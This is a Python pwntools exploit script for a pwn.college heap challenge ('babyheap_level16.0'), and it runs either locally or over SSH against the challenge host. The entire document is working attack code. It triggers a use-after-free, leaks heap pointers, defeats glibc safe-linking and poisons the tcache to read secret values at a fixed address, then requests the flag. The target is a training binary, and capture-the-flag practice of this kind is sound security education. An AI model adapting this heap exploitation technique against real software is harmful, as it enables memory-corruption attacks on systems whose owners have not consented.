from pwn import *
from pwn import p64
from time import sleep
context.binary=e=ELF("./babyheap_level16.0")
libc=ELF("../libc.so.6")
gs="""
set follow-fork-mode parent
"""
if args.LOCAL:
    p=e.process()
    if args.GDB:
        gdb.attach(p,gs)
        pause()
elif args.REMOTE:
    s=ssh(host="dojo.pwn.college",user="hacker",keyfile="~/pwn_college/key",ignore_config=True)
    p=s.process("/challenge/babyheap_level16.0")
if args.DEBUG:
    context.log_level='debug'
def malloc(idx: int,size: int):
    p.sendlineafter(b"[*] Function",b"malloc")
    p.sendlineafter(b"Index: ",str(idx).encode())
    p.sendlineafter(b"Size: ",str(size).encode())
    sleep(1)
def free(idx: int):
    p.sendlineafter(b"[*] Function",b"free")
    p.sendlineafter(b"Index: ",str(idx).encode())
    sleep(1)
def puts(idx: int):
    p.sendlineafter(b"[*] Function",b"puts")
    p.sendlineafter(b"Index: ",str(idx).encode())
    p.recvuntil(b"Data: ")
    sleep(1)
    return p.recvuntil(b"\n").rstrip()
def scanf(idx: int,buffer: bytes):
    p.sendlineafter(b"[*] Function",b"scanf")
    p.sendlineafter(b"Index: ",str(idx).encode())
    #p.sendlineafter(f"allocations[{idx}])\n".encode(),buffer)
    p.sendline(buffer)
    sleep(1)
malloc(1,0x38)
free(1)
leaked1=puts(1)[::-1]
log.info("pos1 >> 12 = 0x{}".format(leaked1.hex()))
scanf(1,p64(0)*2)
free(1)
leaked2=puts(1)[::-1]
log.info("(pos1 >> 12) ^ pos1 = 0x{}".format(leaked2.hex()))
pos1= (int(leaked1.hex(),16)) ^ int(leaked2.hex(),16)
log.info(f"pos1 = {hex(pos1)}")
scanf(1,p64((pos1 >> 12) ^ 0x43A280)+p64(0))
pause()
malloc(1,0x38)
p.recvuntil(b"| 0x43a280            | 0                   | 0 (NONE)                     | 0x")
long1=int(p.recv(16).decode(),16)
p.recvuntil(b"0x")
long2=int(p.recv(16).decode(),16)
p.sendline(b"send_flag")
p.sendline(p64(long1)+p64(long2))
p.interactive()